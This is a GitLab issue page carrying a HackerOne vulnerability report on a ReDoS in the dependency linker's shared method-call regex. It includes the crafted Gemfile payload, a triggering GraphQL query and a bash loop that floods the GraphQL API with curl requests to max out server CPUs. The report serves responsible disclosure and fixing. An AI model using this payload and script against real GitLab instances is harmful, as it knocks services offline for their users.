

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ReDoS in dependency linker for multiple filetypes that use the shared `link\_method\_call` regexp

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2370084](https://hackerone.com/reports/2370084)** by `joaxcar` on 2024-02-10, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

(note this is similar to <https://hackerone.com/reports/2359528> but its two different regexps and are thus not related)

There are multiple `DependencyLinker` files that are responsible for generating links in dependency files. This usually happens during `highligher` when files are shown in plain view. A few of these linker files use the shared `link_method_call` function to generate the regexps to match links. This shared regexp generator is subject to catastrophic backtracking.

The regexp in [`link_method_call`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/dependency_linker/method_linker.rb) looks like this

```
def method_call_regex(method_name, value = nil)
        method_name = regexp_for_value(method_name)
        value = regexp_for_value(value)

        %r{
          #{method_name}            # Method name
          \s*                       # Whitespace
          [(=]?                     # Opening brace or equals sign
          \s*                       # Whitespace
          ['"](?<name>#{value})['"] # Package name in quotes
        }x
      end
```

When this is used for example in `GemfileLinker` its used like this

```
        link_method_call('source', URL_REGEX, &:itself)
```

and the final generated regexp looks like this

```
    /source\s*[(=]?\s*['"](?<name>https?:\/\/[^'" ]+)['"]/
```

To break this regexp use a pattern like this

```
'source' + ' '.repeat(50000) + '"http://u'
```

inside of a file named `Gemfile`.

The attacker can make the GitLab instance unresponsive by sending 1 request a second to

> <https://gitlab.example.com/GROUP/PROJECT/-/blob/main/go.mod?ref_type=heads&format=json&viewer=simple>

to put all CPUs at max capacity (tested on 1K reference architecture)

##### Steps to reproduce

Use a local hosted Gitlab server

1. Log in to Gitlab
2. Create a new project (or use an existing one), make it public (for ease of attack)
3. Upload the file attached here (or create your own one named `Gemfile`)

[![Gemfile](data:image/gif;base64...)](https://user-content.gitlab-static.net/3b16deaa24c96c5a898bb0f8649fa71d637c893a/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38313430313365372d653962322d343163342d383230312d3230343333376566666330382f47656d66696c65)

4. Go to `https://gitlab/example.com/-/graphql-explorer` and run this GraphQL query (replacing GROUPNAME/PROJECTNAME)

```
query {
  project(fullPath: "GROUPNAME/PROJECTNAME") {
    repository {
      blobs(ref:"main", paths: ["Gemfile"]) {
        nodes {

          plainData
        }
      }
    }
  }
}
```

5. The query should take a long time (probably error out)
6. To exhaust the server, run this script in a terminal (change the URL and Project)

```
###  !/bin/bash

###  URL to which the curl request will be made
URL="https://gitlab.example.com"
PROJECT="groupname/projectname"

###  Duration for the loop to run: 1 minutes (60 seconds)
DURATION=60

###  Start time
START_TIME=$(date +%s)

###  Loop until the duration is reached
while [ $(($(date +%s) - START_TIME)) -lt $DURATION ]; do
    # Make the curl request
    curl "$URL/api/graphql" \
  -H 'Content-Type: application/json' \
--data-raw '{"query":"query{project(fullPath:\"'$PROJECT'\"){repository{blobs(ref:\"main\",paths:[\"Gemfile\"]){nodes{plainData}}}}}","variables":null}' &

    # Wait for 1 second
    sleep 1
done
```

7. SSH into the gitlab server and use `top` or `htop` to view the CPU usage

[![Screenshot_2024-02-10_at_08.43.18.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/7b25fe75d6fe654dd993781b41157fa88233edad/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38376534346661612d613963392d343764332d393363312d3763643163323635616136662f53637265656e73686f745f323032342d30322d31305f61745f30382e34332e31382e706e67)

##### Impact

DOS of gitlab instance and exhaustive resource consumption

##### What is the current *bug* behavior?

Usage of `link_method_call` can cause DOS they way its used in linker files

##### What is the expected *correct* behavior?

The `link_method_call` should be a safe regexp. Or there should be a limit on the amount of whitespace between the `key` and the `value` in the regexp

#### Impact

DOS of gitlab instance and exhaustive resource consumption

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Gemfile](https://h1.sec.gitlab.net/a/814013e7-e9b2-41c4-8201-204337effc08/Gemfile)
* [Screenshot\_2024-02-10\_at\_08.43.18.png](https://h1.sec.gitlab.net/a/87e44faa-a9c9-47d3-93c1-7cd1c265aa6f/Screenshot_2024-02-10_at_08.43.18.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

